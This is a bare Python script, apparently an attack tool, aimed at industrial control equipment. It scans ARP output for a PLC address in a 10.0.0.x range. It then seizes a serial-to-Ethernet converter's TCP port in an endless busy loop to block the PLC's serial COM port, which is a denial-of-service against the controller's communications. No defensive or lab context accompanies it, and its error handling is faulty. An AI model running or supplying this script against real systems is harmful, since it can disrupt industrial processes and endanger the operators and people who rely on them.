import socket
import subprocess
import re

# Function to find the PLC's IP address (assuming it is on the same network)
def find_plc_ip():
    try:
        # Use arp -a to list all devices on the network
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        arp_output = result.stdout

        # Regex to match IP addresses (adjust based on your network)
        ip_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
        ip_list = ip_pattern.findall(arp_output)

        # Assuming the PLC has a known IP range or unique identifier
        for ip in ip_list:
            if ip.startswith("10.0.0."):  # Adjust this condition based on your PLC's IP range
                return ip
        return None
    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None

# Function to block a serial COM port
def block_serial_com(plc_ip, com_port):
    # Map serial COM port to TCP port (adjust based on your converter's configuration)
    tcp_port = 20000 + com_port  # Example: COM1 -> 20001, COM2 -> 20002, etc.

    try:
        # Create a TCP socket and connect to the serial-to-Ethernet converter
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, tcp_port))
        print(f"Blocking serial COM{com_port} by holding TCP connection to {plc_ip}:{tcp_port}")

        # Keep the connection open indefinitely (or until manually terminated)
        while True:
            pass
    except Exception as e:
        print(f"Error blocking serial COM{com_port}: {e}")
    finally:
        sock.close()

# Main script
if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("Failed to find PLC IP address.")
        exit(1)
    print(f"Found PLC IP address: {plc_ip}")

    # Step 2: Block the specified serial COM port
    com_port_to_block = 1  # Change this to the desired COM port (e.g., 1, 2, 3)
    block_serial_com(plc_ip, com_port_to_block)